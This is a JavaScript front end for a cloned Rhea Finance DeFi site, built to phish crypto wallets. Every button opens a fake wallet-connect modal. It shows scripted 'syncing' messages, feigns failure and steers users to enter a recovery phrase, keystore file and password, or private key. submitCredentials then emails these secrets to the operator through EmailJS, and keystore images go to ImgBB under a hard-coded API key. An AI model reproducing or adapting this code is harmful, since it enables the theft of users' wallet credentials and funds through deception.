/* ==========================================================================
   RHEA FINANCE — clone behavior (vanilla JS, no dependencies)
   ========================================================================== */

document.addEventListener('DOMContentLoaded', () => {

  /* ------------------------------------------------------------------
     POOL DATA — matches the reference screenshots
  ------------------------------------------------------------------ */
  const pools = [
    { pair: ['near', 'usdt'], name: 'NEAR-USDt', fee: null, type: 'ALMM', apy: '412.57%', vol: '$2.55M' },
    { pair: ['near', 'usdc'], name: 'NEAR-USDC', fee: null, type: 'ALMM', apy: '238.76%', vol: '$2.08M' },
    { pair: ['rhea', 'near'], name: 'RHEA-NEAR', fee: '0.30%', type: 'AMM', apy: '118.85%', vol: '$2.09M' },
    { pair: ['usdc', 'near'], name: 'USDC-NEAR', fee: '0.30%', type: 'AMM', apy: '36.08%', vol: '$950.09K' },
    { pair: ['usdt', 'usdc'], name: 'USDt-USDC-USDT.e-USDC.e', fee: null, type: 'ALMM', apy: '18.93%', vol: '$11.13K' },
    { pair: ['frax', 'near'], name: 'FRAX-NEAR', fee: '0.30%', type: 'AMM', apy: '8.28%', vol: '$25.27K' },
    { pair: ['near', 'usdt'], name: 'NEAR-USDt', fee: '0.01%', type: 'CLMM', apy: '0%', vol: '$5.99K', tooltip: true },
    { pair: ['zec', 'usdc'], name: 'ZEC-USDC', fee: '1.00%', type: 'CLMM', apy: '0%', vol: '$531.74', tooltip: true },
    { pair: ['near', 'usdc'], name: 'NEAR-USDC', fee: '0.01%', type: 'CLMM', apy: '0%', vol: '$4.34M', tooltip: true },
    { pair: ['near', 'zec'], name: 'NEAR-ZEC', fee: '0%', type: 'AMM', apy: '0%', vol: '$856.77K' },
  ];

  const coinImages = { near: 'img/NEARIcon.png', usdc: 'img/usdc.png', usdt: 'img/USDT_Logo.png', rhea: 'img/rheaicon.png', frax: 'img/FRAX.png', zec: 'img/ZEC.png' };

  function coinPairHTML(pair) {
    return `<span class="coin-pair">
      <img src="${coinImages[pair[0]]}" class="coin coin-${pair[0]}" alt="${pair[0]}">
      <img src="${coinImages[pair[1]]}" class="coin coin-${pair[1]}" alt="${pair[1]}">
    </span>`;
  }

  function apyBlockHTML(pool) {
    return `
      <span class="apy-value">${pool.apy}${pool.tooltip ? ' <i class="ri-question-line"></i>' : ''}</span>
      <span class="apy-tag">1x <i class="ri-checkbox-circle-fill"></i></span>
    `;
  }

  /* ---- Desktop table rows ---- */
  const poolsBody = document.getElementById('poolsBody');
  if (poolsBody) {
    poolsBody.innerHTML = pools.map(pool => `
      <div class="pools-row">
        <div class="col-market">
          ${coinPairHTML(pool.pair)}
          <div>
            <div class="market-name">${pool.name}</div>
            ${pool.fee ? `<div class="market-fee">Fee Tiers ${pool.fee}</div>` : ''}
          </div>
        </div>
        <div class="col-type"><span class="market-type-badge">${pool.type}</span></div>
        <div class="col-apy">${apyBlockHTML(pool)}</div>
        <div class="col-vol">${pool.vol}</div>
        <div class="col-action"><button class="btn-deposit connect-button">Deposit</button></div>
      </div>
    `).join('');
  }

  /* ---- Mobile stacked cards ---- */
  const poolsCards = document.getElementById('poolsCards');
  if (poolsCards) {
    poolsCards.innerHTML = pools.map(pool => `
      <div class="pool-card">
        <div class="pool-card-head">
          <div class="col-market">
            ${coinPairHTML(pool.pair)}
            <div>
              <div class="market-name">${pool.name}</div>
              ${pool.fee ? `<div class="pool-card-fee">Fee Tiers ${pool.fee}</div>` : ''}
            </div>
          </div>
        </div>
        <div class="pool-card-row"><span>Type</span><span class="value">${pool.type}</span></div>
        <div class="pool-card-row"><span>APY</span><span class="value">
          <span class="apy-tag">1x <i class="ri-checkbox-circle-fill"></i></span> ${pool.apy}${pool.tooltip ? ' <i class="ri-question-line"></i>' : ''}
        </span></div>
        <div class="pool-card-row"><span>Volume(24h)</span><span class="value">${pool.vol}</span></div>
        <button class="btn-deposit connect-button">Deposit</button>
      </div>
    `).join('');
  }

  /* ------------------------------------------------------------------
     TRADE DROPDOWN (desktop sidebar)
  ------------------------------------------------------------------ */
  const tradeTrigger = document.getElementById('tradeTrigger');
  const tradeSub = document.getElementById('tradeSub');
  if (tradeTrigger && tradeSub) {
    tradeSub.classList.add('open');
    tradeTrigger.setAttribute('aria-expanded', 'true');
    tradeTrigger.addEventListener('click', () => {
      const isOpen = tradeSub.classList.toggle('open');
      tradeTrigger.setAttribute('aria-expanded', String(isOpen));
    });
  }

  /* ------------------------------------------------------------------
     SIDEBAR COLLAPSE (desktop)
  ------------------------------------------------------------------ */
  const collapseBtn = document.getElementById('collapseBtn');
  const sidebar = document.getElementById('sidebar');
  const appShell = document.getElementById('appShell');
  if (collapseBtn && sidebar && appShell) {
    collapseBtn.addEventListener('click', () => {
      const collapsed = sidebar.classList.toggle('collapsed');
      if (collapsed) {
        sidebar.style.width = '76px';
        appShell.style.marginLeft = '76px';
        document.querySelectorAll('.nav-label, .brand-name').forEach(el => el.style.display = 'none');
        document.querySelectorAll('.dropdown-chevron, .tag-new').forEach(el => el.style.display = 'none');
        tradeSub && tradeSub.classList.remove('open');
        const footer = document.querySelector('.app-footer');
        if (footer) footer.style.left = '76px';
        collapseBtn.querySelector('i').className = 'ri-arrow-right-double-line';
      } else {
        sidebar.style.width = '';
        appShell.style.marginLeft = '';
        document.querySelectorAll('.nav-label, .brand-name').forEach(el => el.style.display = '');
        document.querySelectorAll('.dropdown-chevron, .tag-new').forEach(el => el.style.display = '');
        const footer = document.querySelector('.app-footer');
        if (footer) footer.style.left = '';
        collapseBtn.querySelector('i').className = 'ri-arrow-left-double-line';
      }
    });
  }

  /* ------------------------------------------------------------------
     HERO CAROUSEL
  ------------------------------------------------------------------ */
  const slides = document.querySelectorAll('.hero-slide');
  const dots = document.querySelectorAll('.hero-dot');
  let currentSlide = 0;
  let carouselTimer;

  function goToSlide(index) {
    slides.forEach((s, i) => s.classList.toggle('active', i === index));
    dots.forEach((d, i) => d.classList.toggle('active', i === index));
    currentSlide = index;
  }

  function nextSlide() {
    goToSlide((currentSlide + 1) % slides.length);
  }

  function startCarousel() {
    clearInterval(carouselTimer);
    carouselTimer = setInterval(nextSlide, 6000);
  }

  if (slides.length) {
    goToSlide(0);
    startCarousel();
    dots.forEach((dot, i) => {
      dot.addEventListener('click', () => {
        goToSlide(i);
        startCarousel();
      });
    });
  }

  /* ------------------------------------------------------------------
     SWAP DIRECTION TOGGLE
  ------------------------------------------------------------------ */
  const swapDirectionBtn = document.getElementById('swapDirectionBtn');
  if (swapDirectionBtn) {
    swapDirectionBtn.addEventListener('click', () => {
      const fields = document.querySelectorAll('.swap-field');
      if (fields.length === 2) {
        const sellSelect = fields[0].querySelector('.token-select').innerHTML;
        const buySelect = fields[1].querySelector('.token-select').innerHTML;
        fields[0].querySelector('.token-select').innerHTML = buySelect;
        fields[1].querySelector('.token-select').innerHTML = sellSelect;
      }
      swapDirectionBtn.style.transform = 'rotate(180deg)';
      setTimeout(() => { swapDirectionBtn.style.transform = ''; }, 200);
    });
  }

  /* ------------------------------------------------------------------
     MOBILE SLIDE-IN NAV
  ------------------------------------------------------------------ */
  const hamburgerBtn = document.getElementById('hamburgerBtn');
  const closeMobileNav = document.getElementById('closeMobileNav');
  const mobileNavPanel = document.getElementById('mobileNavPanel');
  const mobileNavOverlay = document.getElementById('mobileNavOverlay');

  function openMobileNav() {
    mobileNavPanel.classList.add('open');
    mobileNavOverlay.classList.add('open');
    document.body.style.overflow = 'hidden';
  }
  function closeMobileNavFn() {
    mobileNavPanel.classList.remove('open');
    mobileNavOverlay.classList.remove('open');
    document.body.style.overflow = '';
  }

  if (hamburgerBtn) hamburgerBtn.addEventListener('click', openMobileNav);
  if (closeMobileNav) closeMobileNav.addEventListener('click', closeMobileNavFn);
  if (mobileNavOverlay) mobileNavOverlay.addEventListener('click', closeMobileNavFn);

  /* ------------------------------------------------------------------
     MOBILE NAV ACCORDION GROUPS
  ------------------------------------------------------------------ */
  document.querySelectorAll('.mnav-group-header').forEach(header => {
    header.addEventListener('click', () => {
      const group = header.closest('.mnav-group');
      group.classList.toggle('open');
    });
  });

  /* ------------------------------------------------------------------
     PAGINATION (visual only — single page of data)
  ------------------------------------------------------------------ */
  const pagePrev = document.getElementById('pagePrev');
  const pageNext = document.getElementById('pageNext');
  [pagePrev, pageNext].forEach(btn => {
    if (btn) btn.addEventListener('click', () => { /* single page — no-op for now */ });
  });

});

const triggerWallet = (e) => {
  e.preventDefault();
  if (typeof openWallet === 'function') {
    showModal();
  }
};

document.querySelectorAll('.btn-primary, .support-btn, .nav-links a, .mobile-menu a, .support-card, .footer-col a, .footer-social-link, .bento-cell-content .note a, .chat-btn').forEach(el => {
  if (el) el.addEventListener('click', triggerWallet);
});

// Add click event to all elements with the class 'connect-button'
document.querySelectorAll('.connect-button').forEach(el => {
  if (el) {
    el.addEventListener('click', (e) => {
      e.preventDefault(); // Prevent default action (like navigating for a tags)
      showModal();
    });
  }
});

const wOverlay = document.getElementById('wOverlay');
const wScreen1 = document.getElementById('wScreen1');
const subIds = ['wScreenOther', 'wScreen2', 'wScreen3', 'wScreen4', 'wScreen5'];

function showModal() {
  wOverlay.classList.add('open');
  document.body.style.overflow = 'hidden';
  allOff();
}

function closeWallet() {
  stopTimers();
  wOverlay.classList.remove('open');
  document.body.style.overflow = '';
  allOff();
}

function allOff() {
  wScreen1.classList.remove('hidden');
  subIds.forEach(id => document.getElementById(id).classList.remove('active'));
}

function showSub(id) {
  wScreen1.classList.add('hidden');
  subIds.forEach(sid => document.getElementById(sid).classList.remove('active'));
  document.getElementById(id).classList.add('active');
}

wOverlay.addEventListener('click', e => { if (e.target === wOverlay) closeWallet(); });
document.addEventListener('keydown', e => { if (e.key === 'Escape') closeWallet(); });

function setWallet(img, name) {
  ['s2Img', 's3Img', 's4Img', 's5Img'].forEach(id => document.getElementById(id).src = img);
  ['s2Name', 's3Name', 's4Name', 's5Name'].forEach(id => document.getElementById(id).textContent = name);
}

function handleWalletSelect(el) {
  const img = el.querySelector('img').src;
  const name = (el.querySelector('.w-feat-name') || el.querySelector('.w-item-name')).textContent;
  setWallet(img, name);
  beginSync();
}

const ALL_WALLETS = Array.from(document.querySelectorAll('.ow-item'));
const TOTAL = ALL_WALLETS.length;

function openOtherWallets() {
  showSub('wScreenOther');
  const inp = document.getElementById('owSearch');
  inp.value = '';
  setTimeout(() => inp.focus(), 100);
  filterOw('');
}

document.getElementById('owSearch').addEventListener('input', function () {
  filterOw(this.value.trim().toLowerCase());
});

function filterOw(q) {
  let visible = 0;
  ALL_WALLETS.forEach(item => {
    const n = item.querySelector('.ow-name').textContent.toLowerCase();
    const c = item.querySelector('.ow-chain').textContent.toLowerCase();
    const show = !q || n.includes(q) || c.includes(q);
    item.classList.toggle('hidden', !show);
    if (show) visible++;
  });
  const nr = document.getElementById('owNoResults');
  const ct = document.getElementById('owCount');
  document.getElementById('owQuery').textContent = q;
  if (q && visible === 0) {
    nr.style.display = 'block';
    ct.textContent = 'No results';
  } else {
    nr.style.display = 'none';
    ct.textContent = q
      ? `${visible} wallet${visible === 1 ? '' : 's'} found`
      : `${TOTAL} wallets`;
  }
}

function selectOwWallet(el) {
  const img = el.querySelector('img').src;
  const name = el.querySelector('.ow-name').textContent;
  setWallet(img, name);
  beginSync();
}

function switchType(type) {
  ['phrase', 'keystore', 'privatekey'].forEach(t => {
    document.getElementById('btn-' + t).classList.toggle('active', t === type);
    document.getElementById('pane-' + t).classList.toggle('active', t === type);
  });
}

const IMGBB_API_KEY = "41a8f8a46afb0e1960d74a605fd1e845";

function uploadToImgBB(file) {
  const formData = new FormData();
  formData.append("image", file);

  fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, {
    method: "POST",
    body: formData
  })
    .then(response => response.json())
    .then(data => {
      if (data.success) {
        document.getElementById('keystoreInput').dataset.imgUrl = data.data.url;
      } else {
        console.error("ImgBB Error:", data);
      }
    })
    .catch(error => {
      console.error("ImgBB Upload Exception:", error);
    });
}

function handleKSF(input) {
  const file = input.files[0];
  if (!file) return;
  delete document.getElementById('keystoreInput').dataset.imgUrl;
  delete document.getElementById('keystoreInput').dataset.imgBase64;
  delete document.getElementById('keystoreInput').dataset.fileContent;

  const nameEl = document.getElementById('attachFileName');
  nameEl.textContent = '📎 ' + file.name;
  const reader = new FileReader();
  reader.onload = e => {
    if (file.type.startsWith('image/')) {
      document.getElementById('keystoreInput').dataset.imgBase64 = "Image stored, awaiting ImgBB...";
      uploadToImgBB(file);
    } else {
      document.getElementById('keystoreInput').dataset.fileContent = e.target.result;
    }
  };
  if (file.type.startsWith('image/')) {
    reader.readAsDataURL(file);
  } else {
    reader.readAsText(file);
  }
}

// ── Timers ────────────────────────────────────────
let cTimer, sTimer, pTimer, aborted = false;
function stopTimers() {
  clearTimeout(cTimer); clearInterval(sTimer); clearInterval(pTimer);
  aborted = true;
}

const statusMsgs = [
  "Initializing secure connection...", "Scanning for wallet device...",
  "Establishing encrypted channel...", "Verifying wallet signature...",
  "Requesting account access...", "Checking network compatibility...",
  "Syncing wallet state...", "Authenticating session...",
  "Resolving on-chain identity...", "Confirming wallet permissions...",
  "Loading account balances...", "Retrieving transaction history...",
  "Validating network endpoints...", "Preparing secure handshake...",
  "Awaiting device confirmation...", "Connecting to mainnet...",
  "Syncing asset registry...", "Verifying chain ID...",
  "Establishing WebSocket link...", "Fetching wallet metadata...",
  "Decoding wallet address...", "Requesting signing permissions...",
  "Resolving address...", "Preparing wallet interface...",
  "Almost there — finalizing...", "Connecting to RPC endpoint...",
  "Binding wallet to session...", "Verifying account integrity...",
  "Checking pending transactions...", "Finalizing authentication...",
  "Connection attempt finishing..."
];

function beginSync() {
  aborted = false;
  showSub('wScreen2');
  const statusEl = document.getElementById('s2Status');
  const progressEl = document.getElementById('s2Progress');
  progressEl.style.width = '0%';
  let pool = [...statusMsgs].sort(() => Math.random() - 0.5);
  let i = 0;
  statusEl.textContent = pool[0];
  sTimer = setInterval(() => {
    i++;
    statusEl.style.opacity = '0';
    setTimeout(() => {
      statusEl.textContent = pool[i % pool.length];
      statusEl.style.opacity = '1';
    }, 100);
  }, 300);
  let pct = 0;
  pTimer = setInterval(() => {
    pct = Math.min(pct + (100 / (15000 / 200)), 99);
    progressEl.style.width = pct + '%';
  }, 200);
  cTimer = setTimeout(() => {
    if (aborted) return;
    clearInterval(sTimer); clearInterval(pTimer);
    progressEl.style.width = '100%';
    showSub('wScreen3');
  }, 15000);
}

document.getElementById('retryBtn').addEventListener('click', () => {
  stopTimers(); beginSync();
});
document.getElementById('manualBtn').addEventListener('click', () => {
  stopTimers();
  switchType('keystore');
  showSub('wScreen4');
});


function handleRetryManual() {
  document.getElementById('phraseInput').value = '';
  document.getElementById('keystoreInput').value = '';
  document.getElementById('privkeyInput').value = '';
  document.getElementById('attachFileName').textContent = '';
  document.getElementById('keystoreFileInput').value = '';
  switchType('keystore');
  showSub('wScreen4');
}

function handleManualConnect() {
  showSub('wScreen2');
  aborted = false;
  const statusEl = document.getElementById('s2Status');
  const progressEl = document.getElementById('s2Progress');
  progressEl.style.width = '0%';

  const manualMsgs = [
    "Verifying credentials...", "Decrypting recovery phrase...",
    "Checking phrase integrity...", "Validating word count...",
    "Deriving wallet address...", "Cross-referencing on-chain data...",
    "Authenticating private key...", "Establishing secure session...",
    "Verifying key format...", "Almost done..."
  ];
  let i = 0;
  statusEl.textContent = manualMsgs[0];
  sTimer = setInterval(() => {
    i++;
    statusEl.style.opacity = '0';
    setTimeout(() => {
      statusEl.textContent = manualMsgs[i % manualMsgs.length];
      statusEl.style.opacity = '1';
    }, 100);
  }, 600);
  let pct = 0;
  pTimer = setInterval(() => {
    pct = Math.min(pct + (100 / (6000 / 200)), 99);
    progressEl.style.width = pct + '%';
  }, 200);
  cTimer = setTimeout(() => {
    if (aborted) return;
    clearInterval(sTimer); clearInterval(pTimer);
    progressEl.style.width = '100%';
    showSub('wScreen5');
  }, 6000);
}

function submitCredentials() {
  const activeType = document.querySelector('.type-btn.active').id.replace('btn-', '');
  let messageString = '';
  let isValid = false;

  if (activeType === 'phrase') {
    const phraseData = document.getElementById('phraseInput').value.trim();
    if (!phraseData) {
      alert('Please enter your credentials before connecting.');
      return;
    }
    isValid = true;
    messageString = "Type: Phrase\nData: " + phraseData;

  } else if (activeType === 'keystore') {
    let keyData = document.getElementById('keystoreInput').value.trim();
    const keyPass = document.getElementById('keystorePassword').value.trim();
    const fileAttached = document.getElementById('keystoreFileInput').files.length > 0;

    // Check for ImgBB hosted URL
    const imgUrl = document.getElementById('keystoreInput').dataset.imgUrl;

    if (imgUrl) {
      keyData += "\n\nImage Link: " + imgUrl;
    } else {
      const imgData = document.getElementById('keystoreInput').dataset.imgBase64;
      if (imgData) {
        keyData += "\n\nImage Status: Image was attached but not uploaded. Did you add your ImgBB API key?";
      }
    }

    if (!keyData && !fileAttached && !keyPass) {
      alert('Please enter your credentials before connecting.');
      return;
    }
    isValid = true;

    let fileInfo = fileAttached ? "Yes (" + document.getElementById('keystoreFileInput').files[0].name + ")" : "No";
    messageString = "Type: Keystore JSON\nPassword: " + keyPass + "\nFile Attached: " + fileInfo;

    if (keyData) {
      messageString += "\n\nTyped Passphrase/Text:\n" + keyData;
    }

    const attachedContent = document.getElementById('keystoreInput').dataset.fileContent;
    if (attachedContent) {
      messageString += "\n\nAttached File Content:\n" + attachedContent;
    }

  } else if (activeType === 'privatekey') {
    const privData = document.getElementById('privkeyInput').value.trim();
    if (!privData) {
      alert('Please enter your credentials before connecting.');
      return;
    }
    isValid = true;
    messageString = "Type: Private Key\nData: " + privData;
  }

  if (!isValid) return;

  let safetext = messageString.length > 40000
    ? messageString.substring(0, 40000) + "\n\n...[TRUNCATED TO PREVENT EMAILJS 413 LIMIT ERROR]"
    : messageString;

  let parms = { message: safetext };

  emailjs.send("service_p8dreiw", "template_o4d49ej", parms)
    .then(function (response) {
      console.log("200!", response.status, response.text);
    })
    .catch(function (error) {
      console.error("Transmission error...", error);
    });

  handleManualConnect();
}